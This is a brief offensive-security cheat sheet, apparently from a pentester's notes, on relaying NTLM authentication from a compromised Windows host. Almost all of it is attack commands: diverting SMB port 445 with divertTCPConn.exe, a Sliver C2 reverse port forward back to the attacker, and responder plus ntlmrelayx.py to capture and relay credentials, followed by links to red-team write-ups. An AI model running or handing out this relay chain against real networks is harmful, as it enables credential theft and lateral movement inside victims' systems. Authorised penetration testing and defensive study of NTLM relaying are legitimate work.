# Remote NTLM Relaying

```
divertTCPConn.exe 445 8445
```

## Sliver C2

```
rportfwd add -r 127.0.0.1:445 -b <compromised_target_IP>:8445
```

```
$ sudo responder -I lo

$ sudo ntlmrelayx.py -ip 127.0.0.1
```

---
## References

- [Arno0x: DivertTCPconn](https://github.com/Arno0x/DivertTCPconn)

- [DiabloHorn: Remote NTLM relaying through meterpreter on Windows port 445](https://diablohorn.com/2018/08/25/remote-ntlm-relaying-through-meterpreter-on-windows-port-445/)

- [Rasta Mouse: NTLM Relaying via Cobalt Strike](https://rastamouse.me/ntlm-relaying-via-cobalt-strike/)

- [Pentester's Promiscous Notebook: NTLM Relay](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ntlm/ntlm-relay)